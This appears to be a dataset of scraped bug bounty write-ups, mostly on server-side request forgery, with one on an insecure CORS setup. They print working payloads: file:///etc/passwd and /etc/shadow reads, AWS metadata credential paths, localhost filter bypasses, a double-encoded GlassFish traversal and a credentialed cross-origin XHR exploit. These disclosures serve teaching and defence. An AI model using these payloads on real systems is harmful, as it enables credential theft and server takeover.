{"source_url": "https://medium.com/@pratiky054/ssrf-to-read-local-files-and-abusing-the-aws-metadata-8621a4bf382", "title": "Ssrf to Read Local Files and Abusing the AWS metadata | by pratik yadav | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@pratiky054/ssrf-to-read-local-files-and-abusing-the-aws-metadata-8621a4bf382. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSsrf to Read Local Files and Abusing the AWS metadata | by pratik yadav | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Ssrf to Read Local Files and Abusing the AWS metadata pratik yadav 4 min read · Apr 21, 2019 -- 3 Listen Share Hello Guys , I am Pratik Yadav ,Currently working as Security Engineer in one Crypto Exchange platform:) Well This not a English Grammer blog so Please ignore any grammatical mistakes. Previously I wrote a blog post about the payment bypass bug which i founded on a Program and i Received lot of positive feedback so it motivated me to share one more findings with the community .If you haven’t read that blog you can read it by following this link . So lets talk about the bug :- Firstly I crawled and manually performed all the operations as a user on that application . And after that i checked every possible request on burp http history and Frankly saying i was looking out for a url redirection Vulnerability . So i Searched on Burp of possible parameters of url= And ended up with a url which basically was something like this https://example.com/viewimage/?url= Aws image location(stored and loaded from aws ) So This endpoint was basically loading the image that i uploaded on the site and my image was stored on aws bucket . As we have got a clear idea that it is loading content. Why not to load content from other domain ? Try RFI ? Steps that i followed:- Trying Xss :)(Failed) Firstly I tried to get a Xss .So i have read many blog about getting a xss . All I did is Simply added http://brutelogic.com.br/poc.svg in the url . So the Final crafted url was like https://example.com/viewimage/?url= http://brutelogic.com.br/poc.svg . So I Visited the url but it was not loading the content but a simple text file gets downloaded And it was having nothing in it. Trying to Read Local Files (Success) Next I tried URL schemas to read internal and make server perform actions ( file:/// , dict:// , ftp:// , gopher:// ..) So the final crafted url was https://example.com/viewimage/?url=file :///etc/passwd And Again a Text File gets downloaded like Press enter or click to view image in full size So When I checked the Text File which was downloaded I was bit surprised by seeing the content of the text file. It Was content of etc/passwd Press enter or click to view image in full size Escalating it More :) Now as I have seen this site was loading images from aws . So i Thought why not to extract internal AWS metadata. Reading Aws EC2 Metadata I replaced the url parameter by To view all categories of instance metadata from within a running instance, use the following URI: http://169.254.169.254/latest/meta-data So the Final crafted url https://example.com/viewimage/?url =http://169.254.169.254/latest/meta-data Now as expected it again downloaded a Txt file and after viewing. it showed below information Press enter or click to view image in full size 4. Now Reading Secrets to Make it more critical :) to rain aws access key , secretaccess key simply i appended this url in the parameter in http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role And it rained the secret access key , token ,region ,etc. So now using aws client I can export this details and could have get access :) Simply This bug allowed me to achieve RCE using a SSRF Vulnerability . To Read More about escalating it After getting the secret key etc you can follow this blog https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/ “Secondly I would like to Thanks ENCIPHERS Team for Training which i attended in Delhi And it was Beautifully conducted by Abhinav mishra , Narendra and abhishek Specially for Creating the Vulnerable application . And the SSRF challenge was same as that I founded in This private program” Now what everyone looks for In Blog Post :)(Bounty) Reported the vulnerability to the program via There BB Program Within a Day I received the message that Bug was fixed and they rewarded Me with 4 Digit $ Bounty and also Bonus But however they where not so happy with me because i escalated it more than enough just to demonstrate and they revoked the credentials :) Thanks Hope you liked my blog post , Please do share this :) Pratik Yadav AWS Bug Bounty Infosecurity Infosec -- -- 3 Written by pratik yadav 620 followers · 71 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://m-q-t.github.io/notes/downnotifer-ssrf/", "title": "downnotifer.com SSRF Bug Writeup", "friendly_explanation": "This is a bug bounty writeup from https://m-q-t.github.io/notes/downnotifer-ssrf/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nhome bug_bounty_writeups box_writeups DownNotifier SSRF Apr 4, 2019 • bug_hunting , bug_writeup , openbugbounty downnotifer.com SSRF Bug Writeup i. Introduction DownNotifier has an open bug bounty progam hosted on https://openbugbounty.org . DownNotifie is a service which periodically scans your websites and notifies you if your website has gone down. Due to the nature of the website and the service it provides, I thought about some application logic bugs which might work, So in mind came SSRF . ii. SSRF Explanation SSRF, sometimes prounced Surf , stands for Server Side Request Forgery. Essentially, with SSRF you are able to send requests originating from the web-server, in which you can leverage to read local files, or even enumerate services on the local system. Within SSRF, exists a subattack you can perform which is known as XSPA (Cross Site Port Attack) With XSPA , you can use server output (which was easier for us in this case), or server response times to fingerprint if local services are running on the server such as ftp, mysql, redis iii. Exploiting XSPA to Enumerate Local Services When browsing to downnotifier we are greeted with: Trying usual loopback addresses like localhost and 127.0.0.1 does not seem to work too well: Also trying to grab files using file:// turned out as expected: I tried some more payloads I found from PayloadAllThings SSRF payload page and found that 0.0.0.0 seemed to be accepted. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery Though, even if it bypassed the filter, will it still work? To see if it would, I added some common ports. 30 seconds later, we can see that we indeed did get an SSRF and were able to enumerate local services. ftp and http are running. iv. Conclusion I reported the bug to DownNotifier and within 24 hour hours there was a response & a patch. I would like to thank DownNotifier for the acknowledgement and the quick patch. Thank you for reading, mqt Sources: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Request Forgery"}
{"source_url": "https://medium.com/@logicbomb_1/the-journey-of-web-cache-firewall-bypass-to-ssrf-to-aws-credentials-compromise-b250fb40af82", "title": "The journey of Web Cache + Firewall Bypass to SSRF to AWS credentials compromise! | by Avinash Jain (@logicbomb) | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@logicbomb_1/the-journey-of-web-cache-firewall-bypass-to-ssrf-to-aws-credentials-compromise-b250fb40af82. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe journey of Web Cache + Firewall Bypass to SSRF to AWS credentials compromise! | by Avinash Jain (@logicbomb) | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in The journey of Web Cache + Firewall Bypass to SSRF to AWS credentials compromise! Avinash Jain (@logicbomb) 5 min read · Apr 25, 2019 -- 7 Listen Share Hi Guys, Back with an interesting hack that I was eagerly waiting to get the writeup to publish. This hack is about a chain of vulnerabilities which includes multiple bypasses in a various different layer which finally lead to access of AWS credentials in India’s biggest stock broker company . Below I’ll explain how I was able to access AWS credentials by first bypassing Web application firewall (WAF) and then leveraged it to SSRF via bypassing Web cache mechanism and finally gets hold of AWS account credentials. (This was done with the explicit permission of the concerned company) D uring the first phase of testing, I found an endpoint which was interacting with some file system so I went ahead to check for LFI (local file inclusion) vulnerability and found that application was behind the Cloudflare firewall — Press enter or click to view image in full size Cloudflare WAF Now to basically bypass the firewall, I had to directly send my request to the origin server hoping that they don’t have whitelisting of IPs request coming to their servers or load balancers — Press enter or click to view image in full size Scenario of usual request call In order to find the origin server IP, I simply ran “dig www.readacted.com” and I had the origin server IP — Press enter or click to view image in full size Following article can help understand by digging the domain gave the origin server ip — https://support.cloudflare.com/hc/en-us/articles/115003687931-Warning-about-exposing-your-origin-IP-address-via-DNS-records and then I simply made the entry in the host file and tried the LFI to read /etc/passwd and below is what I got as the response — Press enter or click to view image in full size Sample Redacted Image So, I managed to bypass the firewall and able to execute LFI vulnerability. When I searched the IP for the whois information, I found that the IP belongs to AWS. Now the next target was to read AWS account credentials by exploiting SSRF vulnerability which I was hoping it would definitely be there because of the designated functionality of the page/URL so without wasting any time, I proceeded to make the API call to read AWS instance metadata ( http://169.254.169.254/latest/meta-data/ )— Press enter or click to view image in full size HTTP Request to read AWS instance metadata HTTP/1.1 200 OK Server: nginx Date: Fri, 06 Apr 2019 14:32:48 GMT Content-Type: text/css;charset=UTF-8 Connection: close Vary: Accept-Encoding Strict-Transport-Security: max-age=15552000 X-Frame-Options: DENY X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block X-Proxy-Cache : HIT Content-Length: 0 But the response was empty with 200 OK response which meant that it surely interacted with the API and then returned the empty response. But why the response was empty? If you look at the above image, you will find the server header as a “ Nginx ” and response header “ X-Proxy-Cache ” which was set by Nginx cache layer whose value was set as “HIT” which meant that when the client tried to access the AWS metadata API, it first hit the Nginx cache layer and gave the response from the cache which was empty. Now basically to get the response from the server, I had to bypass the cache layer for which firstly I needed to understand how URL caching paging rule are made in the nginx caching system. Some references — https://www.digitalocean.com/community/tutorials/how-to-implement-browser-caching-with-nginx-s-header-module-on-centos-7 https://www.howtoforge.com/make-browsers-cache-static-files-on-nginx What I understood is that general caching is done on the URL route path basis so if the URL is https://somewebsite.com/a.html and if it matches the route path (which it will because of caching rule) then it would hit the cache but if the URL is https://somewebsite.com/a.html? then the URL route path will not get matched with the caching rule hence it would miss the cache and get the response from the server. So I proceeded to make the call to read AWS instance metadata API ending with ? or any other special character, not matching the URL route path set in the caching rule( http://169.254.169.254/latest/meta-data? ) and below is the response I got — Press enter or click to view image in full size Web Cache Bypass HTTP Request to access AWS instance metadata HTTP/1.1 200 OK Server: nginx Date: Fri, 06 Apr 2019 14:32:48 GMT Content-Type: text/css;charset=UTF-8 Connection: close Vary: Accept-Encoding Strict-Transport-Security: max-age=15552000 X-Frame-Options: DENY X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block X-Proxy-Cache : MISS Content-Length: 315 ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname identity-credentials/ instance-action instance-id instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ product-codes profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ If you see the “ X-Proxy-Cache ” cache header value, it is now set to “MISS” which meant that now the API call doesn’t hit the caching layer and it fetches the response directly from the server. So I was able to successfully bypass the caching layer to exploit SSRF. Now to read AWS account credentials, I had to make the call to AWS instance metadata security credentials API ( http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance? ) and as I expected, I was able to get hold of it — Press enter or click to view image in full size I got the AWS access ID, secret Access key and the token and using which I was able to login into their AWS account and was able to access plenty of critical stuff. So having first bypassed the Cloudflare firewall, I exploited LFI then escalated it to SSRF by bypassing web cache mechanism and finally I got hold of AWS account credentials by exploiting SSRF vulnerability. So, that’s it about this interesting finding!:) Report details- 06-April-2019 — Bug reported to the concerned company. 07-April-2019 — Bug was marked fixed. 07-April-2019 — Re-tested and confirmed the fix. 09-April-2019 — Rewarded. Thanks for reading! ~ Logicbomb ( https://twitter.com/logicbomb_1 ) Security Bug Bounty Information Security Penetration Testing Hacking -- -- 7 Written by Avinash Jain (@logicbomb) 4.99K followers · 230 following Security Engineer @Microsoft | DevSecOps | Speaker | Breaking stuff to learn | Featured in Forbes, BBC| Acknowledged by Google, NASA, Yahoo, UN etc Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net", "title": "Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty October 10, 2017 Share BugBounty POC 1 Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net by MuhammadKhizerJaved H ey guys! few Months a go i was testing different sites for CORS (Cross Origin Resource Sharing ) issues so that i can see what actually it is as i took about a week to understand it from different sources and blogs so i found a website that was vulnerable and I tried to see what i can do with the CORS issue on it, To test the website for CORS issue i first use CURL, i.e: curl https://api.artsy.net -H “Origin: https://evil.com” -I As you can see the response of Curl request include, Access-Control-Allow-Credentials: true and Access-Control-Allow-Origin: https://evil.com Means that the website is vulnerable to CORS attack, then i followed up with GeekBoy Blog Post as he clearly share the exploit about the CORS issue, I found an API endpoint where i can see the details of user that is logged in, https://api.artsy.net/api/user_details/ Well i use the exploit code Shared by geekboy to check what if i can export user info on that page that includes, id,date created,email,birthday,phone,authentication_token,reset_password_token,collections,devices etc Exploit code: function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(“demo”).innerHTML = alert(this.responseText); } }; xhttp.open(“GET”, “https://api.artsy.net/api/user_details/<User-ID>”, true); xhttp.withCredentials = true; xhttp.send(); } I uploaded the exploit with my poc on my website And now if a logged in user use the exploit on my website his account information will be exported to my website Video At the End I would like to Thanks Geekboy & ALL the other blog posts that helped me to understand and exploit this issue successfully Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC CORS MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X One reply on “Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net” Shuvo Ahmed says: March 2, 2019 at 11:19 am Hello brother i understood all process but without one thing, that is can you tell me how can you found this link https://api.artsy.net/api/user_details/ i mean you know https://api.artsy.net/ is vulnerable by CORS but how you found the api/user/………. link . i also try https://api.artsy.net/ and this site still vulnerable by CORS but when i try to exploit with this link: https://api.artsy.net/ its not working. is there any solution? Thanks Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next What is Subdomain Hijack/Takeover Vulnerability? How to Identify? & Exploit It? Previous Bugcrowd’s Domain & Subdomain Takeover vulnerability! You may also like May 18, 2018 by MuhammadKhizerJaved How I was able to get subscription of $120/year For Free | Bug Bounty POC About 2 Months ago a friend gave me his wetransfer.com account to send a 15GB file to a friend as he was using WeTransfer Plus subscription that he bought for... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 8 Read More January 27, 2018 by How I was able to Download Any file from Web server! Hello to all Masters and Learners, I hope you all are doing well and spending most of your time in hunting and learning. Where most of us spend time to... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 1 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129", "title": "From SSRF To RCE in PDFReacter. What is PDFReacter? \n- PDFReacter is a… | by Armaan Pathan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom SSRF To RCE in PDFReacter. What is PDFReacter? - PDFReacter is a… | by Armaan Pathan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in From SSRF To RCE in PDFReacter Armaan Pathan 2 min read · Apr 18, 2019 -- 3 Listen Share What is PDFReacter? - PDFReacter is a parser which parses HTML content from HTML to PDF. While testing an application I have identified that an application is using the PDFReacter parser. PDFReacter is a formatting processor that parses the HTML content to PDF files.so Since an application has an option to insert data into forms, I started fuzzing with XSS and for that, I simply used <img> tag. there was an option to export the forms to PDF and when I exported the one of the form which has the payload, the final PDF file was like this. Press enter or click to view image in full size This means an application and PDFReacter both do not escapes the HTML tags and processes the HTML tags/XSS Payloads as well. Since I knew that an application is using PDFReacter as a parser and both application and parsers are not escaping my payloads. So the next was with the iframe. I wanted to check if I can load external sites in a final pdf document or not and as you can see that Google is getting loaded in the frame. Press enter or click to view image in full size Now it was clear that I can hit to the external sites by using iframe(SSRF Confirmed). Next step was to read the local files with file:/// wrapper.Simple Payload “><iframe src=”file:///etc/passwd”/></iframe> I used for it. Press enter or click to view image in full size Bang !!!!! Next is to check if the current user has root privileges or not. I Simply tried fetching the shadow file with the below-mentioned payload and I noticed that I was able to fetch the shadow file. “/><iframe src=”file:///etc/shadow”></iframe> Since the Current user has the root privileges, Next was to pop a shell, I Fetched Private SSH keys, And was able to SSH to the server. Press enter or click to view image in full size Although it was not my first RCE, I got goosebumps when I popped the shell. Rahul Maini’s blog helped me a lot to understand the current scenario. Thanks, Maini for an awesome blog. Thanks everyone for reading. JavaScript Bugcrowd Bug Bounty Hackerone Hackernoon -- -- 3 Written by Armaan Pathan 1.6K followers · 4 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326", "title": "Exploiting SSRF like a Boss — Escalation of an SSRF to Local File Read! | by Zain Sabahat | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting SSRF like a Boss — Escalation of an SSRF to Local File Read! | by Zain Sabahat | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Exploiting SSRF like a Boss — Escalation of an SSRF to Local File Read! Zain Sabahat 3 min read · Nov 22, 2018 -- 3 Listen Share Hi Guys! Greetings everyone! Today I am doing another write-up about one of my best findings. It’s an SSRF — Server Side Request Forgery vulnerability I discovered in a private program. In the scope page, the program had few IPs with only Server-Side bugs acceptable in its scope. I picked an IP and started my recon process on it. I found a subdomain https://help.redacted.com hosted on that IP through Reverse IP scan. I used HackerTarget’s Reverse IP lookup tool “ http://api.hackertarget.com/reverseiplookup/?q= {IP}” The subdomain was running a Jira instance. I quickly remembered the Alyssa Herrera ’s article about SSRF Exploitation in Jira instances. I checked the version of the Jira and it seems vulnerable to the SSRF. https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com Press enter or click to view image in full size Successfully rendered google.com and verified the existence of SSRF. Now I was able to render any webpage through that vulnerable endpoint or I could have converted it into XSS by loading an external page but as I have told earlier that the company was only interested in Server-Side and network related issues so I had to dig more. None of the protocols i.e. gopher:// , file:// , ldap:// or ftp:// were working except http:// . It was an azure instance so I tried to fetch the metadata file of the instance from the uri: https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri= http://169.254.169.254/metadata/v1/maintenance but I got nothing but a blank JSON response. Now I needed to think out of the box. I started playing with the endpoint. I tried to load localhost (127.0.0.1) from the uri and it loaded the main page. An idea clicked in my mind that there might be some services were left running on internal ports. I started by the most common port 8080. And then as I thought, I was welcomed by GlassFish server’s default page. Press enter or click to view image in full size After seeing that I quickly reached to the default administration console at Port 4848 . It was the login page of GlassFish server. Press enter or click to view image in full size Sourcecode of GlassFish Administration Console at Port 4848. I searched for the GlassFish exploits and hopefully, I found a GET based exploit: “ https://www.exploit-db.com/exploits/39241/ ” Press enter or click to view image in full size GlassFish Exploit — Read Server Files I crafted that payload: https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri= http:// 127.0.0.1:4848/ theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd But it didn't work!! I got really disappointed and I was about to give up. But then I just noticed that there is url-encoding in that exploit and when it is passed through the browser it gets decoded so I may need to double encode it to pass the correct request on to the GlassFish server. And our final payload was: https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd Press enter or click to view image in full size Successfully read the /etc/passwd file. And resultantly, this simple HTTP-Protocol based SSRF was escalated to a local file read by exploiting an internal service. Kudos to Shawar Khan and HassanKhanYusufzai for helping me to escalate this SSRF to a whole new level. Timeline: November 12, 2018 — Reported. November 12, 2018 — Triaged. November 13, 2018 — Fixed and Rewarded! Thanks for reading! More write-ups coming on the way! Security Infosec Hacking Bug Bounty Cybersecurity -- -- 3 Written by Zain Sabahat 573 followers · 5 following 23-yo; Sr. Security Engineer | Bug Bounty Hunter | OSCP Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@elberandre/ssrf-trick-ssrf-xspa-in-microsofts-bing-webmaster-central-8015b5d487fb", "title": "SSRF Tips: SSRF/XSPA in Microsoft’s Bing Webmaster Central | by Elber Andre | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@elberandre/ssrf-trick-ssrf-xspa-in-microsofts-bing-webmaster-central-8015b5d487fb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSSRF Tips: SSRF/XSPA in Microsoft’s Bing Webmaster Central | by Elber Andre | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SSRF Tips: SSRF/XSPA in Microsoft’s Bing Webmaster Central Elber Andre 2 min read · Apr 9, 2019 -- Listen Share Today I’m going to talk about a trick that might be useful for BugHunters. While I was looking for a few things about BugBounty, I found a report where the author talked about an SSRF which he had found in Bing’s Webmaster Central, and reported to Microsoft. In the Bug it describes that it was able to list internal ports and the services of that application. More info on: https://blog.0daylabs[.]com/2015/08/09/SSRF-in-Microsoft-bing/ Seeing this I thought “What if I try a new bypass on this fix?”, I like challenges, so I opened my browser and started testing. Press enter or click to view image in full size First I tried a list of payloads that resolved to ‘127.0.0.1’, but their filter did not allow those addresses. Press enter or click to view image in full size As they were blocking access via the address ‘127.0.0.1’, and also registering ip addresses, I used the “.nip.io” domain to be able to bypass that first check along with the ip ‘127.127.127.127’. 127.127.127.127.nip.io Press enter or click to view image in full size Press enter or click to view image in full size It was enough to deduce that I had been able to access their local address. Note that with “127.127.127.127” it does a redirect to “/toolbox/webmaster/” After that I tried to access a nonexistent directory, to check the server responses. Press enter or click to view image in full size Conclusion: Setting up a domain to resolve the address ‘127.127.127.127’ I was able to bypass the old fix, list internal ports and directories in the local address of Bing Webmaster, sometimes many administrative panels are configured to be accessed only locally, which could be found by scanning directories through this SSRF. Follow me :D http://twitter.com/elber333 DNS Ssrf Bug Bounty Microsoft Bing -- -- Written by Elber Andre 554 followers · 55 following Pentester , CTF player, Bug Hunter & Security Researcher \\nTwitter: https://twitter.com/elber333 No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@tungpun/from-ssrf-to-local-file-disclosure-58962cdc589f", "title": "From SSRF to Local File Disclosure | by Tung Pun | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@tungpun/from-ssrf-to-local-file-disclosure-58962cdc589f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom SSRF to Local File Disclosure | by Tung Pun | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in From SSRF to Local File Disclosure Tung Pun 2 min read · Nov 8, 2017 -- 5 Listen Share This blog is written about a bug (I believe), that was found on my last weekend. It located on a website from a private program X on Hackerone. That website has an API, allows users input their URL and email. In the backend, there is a simulated browser, which tries to open that URL and send the screenshot to user’s email. Actually, I don’t have any idea about that simulated browser, not sure if it is a real one or not. First thing, I inject a requestb.in URL, and the received User-Agent is Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Personally, I am interested in SSRF bug, and this case I have the response, so, I thought that I might have some funs. After the requestb.in URL, I tried my luck with: http://localhost http://0 http://127.0.0.1 https://localhost http://localhost:8080 http://192.168.0.1 The server accepts these URL, open it and send the result to my inbox. But the received responses are Err: timeout for almost times. The hard thing is the limited number of URLs to be inputted. So, I couldn’t do the brute-force to test Boolean-based. OK. Now is the time for the local file: file:/// file:///etc/passwd file:///c/ chrome://about about:addons These above payloads had been used to injected as URLs. However, this time, the server stopped me and said that they are invalid URLs. I paused when there are not any ideas in my head. That night, after a cup of Asahi beer, I decided to brainstorm again. Is there anything else that I forgot? Oh, http ? Yes. file ? Yes. chrome ? Yes…. How about other services? ftp ? Promptly, ftp://example.com has been inserted. It worked. Then, I was confused about which keyword had been filtered on the server. I replaced ftp by file , and it worked also. How so? Yes. The problem is /// , we only need a couple of / , if there are more than, the server would think it is an invalid URL. Then, I tried with file:// . Press enter or click to view image in full size Index of page was in the response. Awesome! Then, how about /etc/passwd ? Hmm. The URL would be: file://s/etc/passwd Press enter or click to view image in full size Awesome, again!!! And that is my PoC. I submitted the report to that program; unfortunately, they fixed and said that they aware of that issue and closed as Informative. Actually, I still don’t really understand that decision, however, I don’t want to argue with triggers, then, it should be fine. — If you like my sharing, please consider buying me a coffee . ☕️ Security Bug Hackerone Ssrf Bugbounty -- -- 5 Written by Tung Pun 186 followers · 61 following Hey 👋I’m Tung Pun. Sometimes I share my interesting findings and thought. Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.openbugbounty.org/blog/leonmugen/ssrf-reading-local-files-from-downnotifier-server/", "title": "SSRF | Reading Local Files from DownNotifier server – Open Bug Bounty Blog", "friendly_explanation": "This is a bug bounty writeup from https://www.openbugbounty.org/blog/leonmugen/ssrf-reading-local-files-from-downnotifier-server/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSSRF | Reading Local Files from DownNotifier server – Open Bug Bounty Blog Search for: Search Skip to content For Researchers Frequently Asked Questions Read the FAQ to get best experience with our platform Write a Blog Post Write a blog post to share your knowledge and get kudos Browse Bug Bounty Programs Browse active bug bounty programs run by website owners Report a Vulnerability Report and help remediate a vulnerability found on any website How it Works Download presentation and learn how our platform works PDF, 500kb For Website Owners FAQ: For Website Owners Start here to ensure smooth collaboration with the security researchers Start a Bug Bounty Start your bug bounty program at no cost and leverage crowd-security testing FAQ: For Bug Bounty Owners Read how to maximize your ROI from crowd-security testing How it Works Download presentation and learn how our platform works PDF, 500kb About About the Project Read about Open Bug Bounty history, values and mission API Request National CERTs and law enforcement agencies may request our API Frequently Asked Questions Review the most popular questions about the project Contact Us Get in touch How it Works Download presentation and learn how our platform works PDF, 500kb Hall of Fame Forum SSRF | Reading Local Files from DownNotifier server Posted on September 18, 2019 by Leon Hello guys, this is my first write-up and I would like to share it with the bug bounty community, it’s a SSRF I found some months ago. DownNotifier is an online tool to monitor a website downtime. This tool sends an alert to registered email and sms when the website is down. DownNotifier has a BBP on Openbugbounty, so I decided to take a look on https://www.downnotifier.com . When I browsed to the website, I noticed a text field for URL and SSRF vulnerability quickly came to mind. Getting XSPA The first thing to do is add http:127.0.0.1:22 on “Website URL” field. Select “When the site does not contain a specific text” and write any random text. I sent that request and two emails arrived in my mailbox a few minutes later. The first to alert that a website is being monitored and the second to alert that the website is down but with the response inside an html file. And what is the response…? Getting Local File Read I was excited but that’s not enough to fetch very sensitive data, so I tried the same process but with some uri schemes as file, ldap, gopher, ftp, ssh, but it didn’t work. I was thinking how to bypass that filter and remembered a write-up mentioning a bypass using a redirect with Location header in a PHP file hosted on your own domain. I hosted a php file with the above code and the same process registering a website to monitor. A few minutes later an email arrived at the mailbox with an html file. And the response was… I reported the SSRF to DownNotifier support and they fixed the bug very fast. I want to thank the DownNotifier support because they were very kind in our communication and allowed me to publish this write-up. I also want to thank the bug bounty hunter who wrote the write-up where he used the redirect technique with the Location header. Write-up: https://medium.com/@elberandre/1-000-ssrf-in-slack-7737935d3884 Categories Security Researchers Insights Tags SSRF , Writeup Leon Cybersecurity enthusiast. Post navigation Previous Previous post: Collection of information | Google Hacking and Dorks basic Next Next post: #Security 100% Leave a Reply Cancel reply You must be logged in to post a comment. Categories Bug Bounty Articles Open Bug Bounty Community News Open Bug Bounty Platform Updates Security Researchers Insights Tags adobe xss angular xss apple xss Bot bugbounty bughunter Bughunting cross site scripting cross site scripting xss CSRF cybersecurity ethical hacking funny google dorks hacking infosec israel xss keylogger news Openbugbounty open redirect security security research sqli payload Stored XSS Stored XSS vulnerability webHacking web security wordpress Writeup xss xss attack xss 